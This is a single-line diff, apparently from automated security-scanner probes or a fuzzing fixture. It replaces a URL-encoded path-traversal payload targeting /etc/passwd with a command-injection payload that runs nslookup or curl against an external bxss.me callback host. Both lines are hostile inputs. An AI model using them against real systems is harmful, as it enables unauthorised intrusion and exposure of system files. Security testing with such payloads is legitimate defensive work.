@@ -1,1 +1,1 @@
-..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+$(nslookup -q=cname hitckysonjarw78e1b.bxss.me||curl hitckysonjarw78e1b.bxss.me)
